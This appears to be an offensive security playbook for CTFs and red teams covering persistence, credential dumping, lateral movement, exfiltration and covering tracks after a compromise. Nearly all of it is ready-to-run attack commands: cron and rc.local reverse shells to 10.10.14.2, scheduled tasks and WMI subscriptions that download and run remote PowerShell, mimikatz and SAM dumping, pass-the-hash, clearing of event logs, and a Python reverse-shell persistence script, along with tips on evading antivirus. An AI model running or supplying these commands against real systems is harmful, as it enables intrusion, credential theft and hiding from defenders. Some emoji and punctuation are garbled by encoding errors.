---
icon: hand-fist
---

# Persistence & Lateral Movement

## **Post-Exploitation: Persistence & Lateral Movement â€” The Operatorâ€™s Playbook**

***

Once youâ€™ve escalated to root or SYSTEM, the game shifts from â€œgetting inâ€ to **staying in**, **expanding access**, and **owning the environment**.\
Post-exploitation is where reconnaissance becomes control â€” persistence, data theft, privilege expansion, and stealth are your weapons.

This section focuses on **real-world operator methodology** for maintaining and extending access during CTFs, red team operations, and advanced labs.

***

### I. ðŸ§© Core Concepts

| Concept                 | Description                                            |
| ----------------------- | ------------------------------------------------------ |
| **Persistence**         | Methods to maintain access after reboot or logout.     |
| **Lateral Movement**    | Expanding from one system/user to another.             |
| **Privilege Retention** | Ensuring continuous elevated access.                   |
| **Data Exfiltration**   | Extracting sensitive information (flags, creds, loot). |
| **Covering Tracks**     | Evading detection and cleaning artifacts.              |

***

### II. ðŸ”’ Persistence Techniques

Persistence is about **surviving resets and reboots** â€” staying invisible yet present.

***

#### ðŸ§  1. Linux Persistence

**ðŸ”¹ Add a Cron Job**

```bash
echo "@reboot bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" >> /etc/crontab
```

**ðŸ”¹ Modify rc.local**

```bash
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1 &" >> /etc/rc.local
chmod +x /etc/rc.local
```

**ðŸ”¹ SSH Key Injection**

```bash
mkdir -p ~/.ssh
echo "your_public_key_here" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**ðŸ”¹ Backdoor with SUID Shell**

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Then later:

```bash
/tmp/rootbash -p
```

***

#### ðŸ§© 2. Windows Persistence

**ðŸ”¹ Registry Autorun**

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe" /f
```

**ðŸ”¹ Scheduled Task**

```powershell
schtasks /create /sc onlogon /tn "Backdoor" /tr "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/p.ps1')"
```

**ðŸ”¹ Service Creation**

```powershell
sc create Backdoor binpath= "C:\rev.exe" start= auto
net start Backdoor
```

**ðŸ”¹ WMI Event Subscription (Stealth)**

```powershell
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="filt",EventNamespace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="cons",CommandLineTemplate="powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/p.ps1')"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='filt'",Consumer="CommandLineEventConsumer.Name='cons'"
```

***

### III. ðŸ§  Credential Extraction & Token Abuse

Post-exploitation means turning **secrets into new access**.

#### ðŸ§© Linux

```bash
cat /etc/shadow
grep -r "password" /home 2>/dev/null
strings /var/log/auth.log
```

Dump SSH keys:

```bash
find /home -name "id_rsa" 2>/dev/null
```

***

#### ðŸ§© Windows

Dump credentials from memory (with SYSTEM):

```powershell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Dump SAM/SECURITY/NTDS:

```powershell
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```

Use `secretsdump.py`:

```bash
secretsdump.py -sam sam -system system LOCAL
```

Token impersonation:

```powershell
PrintSpoofer64.exe -i -c cmd.exe
```

***

### IV. ðŸš€ Lateral Movement Techniques

Once persistence is stable, expand laterally.\
Goal: **move to other systems or accounts**, harvesting domain-wide access.

***

#### ðŸ§© 1. Credential Reuse

Use dumped hashes or passwords to connect to other systems.

```bash
ssh user@10.10.10.11
evil-winrm -i 10.10.10.11 -u user -p pass
```

***

#### ðŸ§© 2. Pass-the-Hash (Windows)

```powershell
psexec.py DOMAIN/user@10.10.10.11 -hashes <LM:NT>
```

***

#### ðŸ§© 3. Pass-the-Ticket (Kerberos)

Dump tickets:

```powershell
mimikatz.exe
sekurlsa::tickets
```

Use:

```powershell
kerberos::ptt <ticket.kirbi>
```

***

#### ðŸ§© 4. SSH Key Propagation (Linux)

```bash
for host in $(cat hosts.txt); do
    ssh-copy-id user@$host
done
```

***

#### ðŸ§© 5. SMB/WinRM Propagation (Windows)

```powershell
crackmapexec smb 10.10.10.0/24 -u admin -p password
crackmapexec winrm 10.10.10.0/24 -u admin -p password --exec "whoami"
```

***

### V. ðŸ§° Data Exfiltration

Your end goal in CTFs: get flags, credentials, or loot.

#### ðŸ§  Simple Exfil

```bash
tar czf loot.tar.gz /root/.ssh /var/www/html/*.php
python3 -m http.server 8080
```

Download:

```bash
wget http://<attacker_ip>:8080/loot.tar.gz
```

#### ðŸ’£ Stealthy Windows Exfil

```powershell
Compress-Archive -Path C:\Users\Admin\Documents -DestinationPath C:\temp.zip
certutil -urlcache -split -f "http://10.10.14.2/upload.zip" C:\temp.zip
```

***

### VI. ðŸ§¹ Covering Tracks

Once you have persistence and loot, **clean your footprints**.

#### ðŸ§© Linux

```bash
history -c
rm -rf /tmp/*
find / -name ".bash_history" -exec rm {} \; 2>/dev/null
```

#### ðŸ§© Windows

```powershell
del /F /Q C:\Windows\Temp\*
wevtutil cl Security
wevtutil cl System
Remove-Item -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

***

### VII. ðŸ§  Real-World Operator Workflow

```bash
# Step 1: PrivEsc achieved
whoami

# Step 2: Persistence
(cron / reg add / schtasks)

# Step 3: Cred extraction
mimikatz / /etc/shadow

# Step 4: Lateral movement
crackmapexec smb 10.10.10.0/24 -u user -p password

# Step 5: Exfiltration
tar czf /tmp/loot.tar.gz /home/*flag*
python3 -m http.server 8000
```

***

### VIII. ðŸ§© Tools & Frameworks

| Tool                          | Purpose                                  |
| ----------------------------- | ---------------------------------------- |
| **Metasploit (post modules)** | Automated post-exploitation              |
| **Empire**                    | PowerShell-based C2 & persistence        |
| **CrackMapExec**              | SMB/WinRM movement & credential spraying |
| **Mimikatz / LaZagne**        | Credential dumping                       |
| **SharpHound (BloodHound)**   | Lateral movement graphing                |
| **LinPEAS / WinPEAS**         | Enumeration for persistence              |
| **Chisel / SSH / Socat**      | Pivoting & tunneling                     |

***

### IX. ðŸ§  Pro Tips & Red Team Tricks

âœ… **Persistence Safety**

* Always duplicate your access method (cron + SSH key, or schtasks + service).
* Rotate ports and encode payloads to bypass AV.

âœ… **Lateral Movement Logic**

* Prioritize systems with administrative sessions (`net sessions`).
*   Enumerate users and trust relationships:

    ```powershell
    net view /domain
    net group "Domain Admins" /domain
    ```

âœ… **Data Discipline**

*   Store loot in organized folders:

    ```
    /loot/
    â”œâ”€â”€ creds.txt
    â”œâ”€â”€ shadow_dumps/
    â”œâ”€â”€ screenshots/
    â””â”€â”€ flags/
    ```
* Compress before exfil to reduce signatures.

âœ… **Operational Security**

* Always clean shell history before disengagement.
* Randomize filenames, ports, and service names.
* Encrypt communication channels when possible.

***

### X. âš”ï¸ Bonus: Persistence + C2 Template (Linux)

```bash
#!/bin/bash
# Minimal C2 Persistence
if ! pgrep -f revshell.py > /dev/null; then
    nohup python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.2",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' &
fi
(crontab -l; echo "@reboot /tmp/revshell.py") | crontab -
```

***
